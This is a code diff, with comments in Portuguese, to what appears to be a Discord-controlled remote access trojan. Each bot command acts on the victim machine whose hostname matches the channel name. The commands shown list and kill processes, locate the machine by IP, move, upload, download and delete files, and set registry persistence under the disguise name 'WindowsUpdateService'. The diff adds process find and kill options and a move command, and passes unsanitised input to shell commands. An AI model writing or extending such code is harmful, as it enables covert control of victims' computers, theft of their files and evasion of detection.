@@ -140,7 +140,7 @@ async def help_command(interaction: discord.Interaction):
         embed.add_field(name="/cd <path>", value="Altera o diretório atual.", inline=False)
         embed.add_field(name="/ls", value="Lista os arquivos e pastas do diretório.", inline=False)
         embed.add_field(name="/proc", value="Lista os processos ativos.", inline=False)
-        embed.add_field(name="/loc", value="Mostra localização aproximada via IP.", inline=False)
+        embed.add_field(name="/loc", value="Mostra a localização aproximada via IP.", inline=False)
         embed.add_field(name="/dwn <path>", value="Faz download de um ficheiro.", inline=False)
         embed.add_field(name="/up <ficheiro> <destino>", value="Envia um ficheiro para a máquina.", inline=False)
         embed.add_field(name="/del <path>", value="Apaga um ficheiro ou diretório.", inline=False)
@@ -227,14 +227,14 @@ async def ls(interaction: discord.Interaction):
                 full_path = os.path.join(path_atual, item)
                 tipo = "📁" if os.path.isdir(full_path) else "📄"
 
-                # acrescenta o tamanho do ficheiro/pasta
+                #acrescenta o tamanho do ficheiro/pasta
                 try:
                     tamanho = os.path.getsize(full_path)
                     tamanho_str = f"{tamanho / 1024:.1f} KB" if tamanho < 1024**2 else f"{tamanho / 1024**2:.1f} MB"
                 except:
                     tamanho_str = "?"
 
-                # acrescenta a data de modificação do ficheiro/pasta
+                #acrescenta a data de modificação do ficheiro/pasta
                 try:
                     data_mod = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(os.path.getmtime(full_path)))
                 except:
@@ -259,17 +259,41 @@ async def ls(interaction: discord.Interaction):
 
 
 @bot.tree.command(name="proc", description="Lista os processos em execução na máquina")
-async def process(interaction: discord.Interaction):
+async def process(interaction: discord.Interaction, find: str = None, kill: str = None):
     if interaction.channel.name.lower() == platform.node().lower():
         await interaction.response.defer(thinking=True)
         normal_activity()
         try:
             output = subprocess.check_output("tasklist" if platform.system() == "Windows" else "ps aux", shell=True, text=True, stderr=subprocess.STDOUT, encoding=ENCODING)
+            #divide o output em linhas
+            linhas = output.strip().splitlines()
+
+            #argumento find (encontrar um processo especifico)
+            if find:
+                linhas_filtradas = [linha for linha in linhas if find.lower() in linha.lower()]
+                resultado = "\n".join(linhas_filtradas)
+                if not resultado.strip():
+                    resultado = f"Nenhum processo encontrado contendo: {find}"
+            else:
+                resultado = output
+
             file_path = "process_list.txt"
             with open(file_path, "w", encoding="utf-8") as f:
-                f.write(output)
+                f.write(resultado)
             await interaction.followup.send("Lista de processos:", file=discord.File(file_path))
             os.remove(file_path)
+            
+            #argumento kill (encerra um processo)
+            if kill:
+                try:
+                    if platform.system() == "Windows":
+                        subprocess.run(f"taskkill /F /IM {kill}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    else:
+                        subprocess.run(f"pkill -f {kill}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    await interaction.followup.send(f"☠️ Processo `{kill}` encerrado com sucesso.")
+                except Exception as e:
+                    await interaction.followup.send(f"❌ Erro ao tentar encerrar `{kill}`: {e}")
+
         except subprocess.CalledProcessError as e:
             await interaction.followup.send(f"Erro ao obter processos: {e}", ephemeral=True)
     else:
@@ -335,6 +359,30 @@ async def upload(interaction: discord.Interaction, ficheiro: discord.Attachment,
 
         except Exception as e:
             await interaction.followup.send(f"❌ Erro ao guardar o ficheiro: `{e}`")
+    else:
+        await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!", ephemeral=True)
+
+
+@bot.tree.command(name="mv", description="Move um ficheiro ou pasta para outro caminho.")
+async def mv(interaction: discord.Interaction, source: str, destino: str):
+    if interaction.channel.name.lower() == platform.node().lower():
+        await interaction.response.defer(thinking=True)
+        normal_activity()
+
+        try:
+            if not os.path.exists(source):
+                await interaction.followup.send(f"❌ O caminho de origem `{source}` não existe.")
+                return
+
+            # Cria diretório destino, se necessário
+            destino_dir = destino if os.path.isdir(destino) else os.path.dirname(destino)
+            if destino_dir and not os.path.exists(destino_dir):
+                os.makedirs(destino_dir, exist_ok=True)
+
+            shutil.move(source, destino)
+            await interaction.followup.send(f"✅ `{source}` movido para `{destino}` com sucesso.")
+        except Exception as e:
+            await interaction.followup.send(f"❌ Erro ao mover: {e}")
     else:
         await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!", ephemeral=True)
 
@@ -467,7 +515,7 @@ async def persist(interaction: discord.Interaction):
         await interaction.response.defer(thinking=True)
         normal_activity()
         try:
-            # Caminho absoluto do executável atual
+            #caminho absoluto do executavel atual
             exe_path = os.path.abspath(sys.argv[0])
             reg_name = "WindowsUpdateService"
 
